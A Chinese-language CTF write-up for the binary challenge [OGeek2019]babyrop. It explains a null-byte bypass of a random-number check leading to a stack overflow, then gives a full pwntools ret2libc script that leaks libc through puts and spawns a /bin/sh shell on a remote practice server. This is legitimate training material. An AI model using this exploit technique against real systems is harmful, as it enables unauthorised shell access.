---
title: "[OGeek2019]babyrop"
description: ""
date: 2023-04-07T00:16:37+08:00
lastmod: 2023-04-07T00:16:37+08:00
draft: false
images: []
type: docs
weight: 991
toc: true
---

## 0x01 分析

main函数主要就是读取一个随机数

![cf272a808a7811746af8834c2384af55](images/cf272a808a7811746af8834c2384af55.png)  

然后让我们输入和给定的随机数进行比较

![9201263ba3d26ed43e867c896f8d9957](images/9201263ba3d26ed43e867c896f8d9957.png)  

我们可以直接在开头输入 `\x00` 进行截断，绕过比较，然后返回的buf\[7\]的值会作为下一个函数的参数

![6e1636b6eccfded62f9a8cc5b63bb9ea](images/6e1636b6eccfded62f9a8cc5b63bb9ea.png)  

只要buf\[7\]的值够的就可以造成溢出，然后就是正常的ret2libc了

## 0x02 Exploit

```python
from pwn import*
context.log_level = 'debug'
# o = process("./pwn")
o = remote("node4.buuoj.cn", 29781)
elf = ELF("./pwn")
libc = ELF("./libc-2.23.so")
puts_plt = elf.plt['puts']
read_got = elf.got['read']
main = 0x8048825

# leak libc
key = b"\x00" + b"\xff"*7
o.sendline(key)
o.recv()
payload = b'a'*(0xe7+4) + p32(puts_plt) + p32(main) + p32(read_got)
o.sendline(payload)
read_addr = u32(o.recv(4))
libc_base = read_addr - libc.sym["read"]
log.info(hex(libc_base))
sys_addr = libc_base + libc.sym["system"]
bin_sh = libc_base + next(libc.search(b"/bin/sh"))

# attack
o.sendline(key)
payload = b'a'*(0xe7+4) + p32(sys_addr) + p32(main) + p32(bin_sh)
o.sendline(payload)
o.interactive()
```

![288c4b6845267a9430c590cca1822169](images/288c4b6845267a9430c590cca1822169.png)  

自行调试
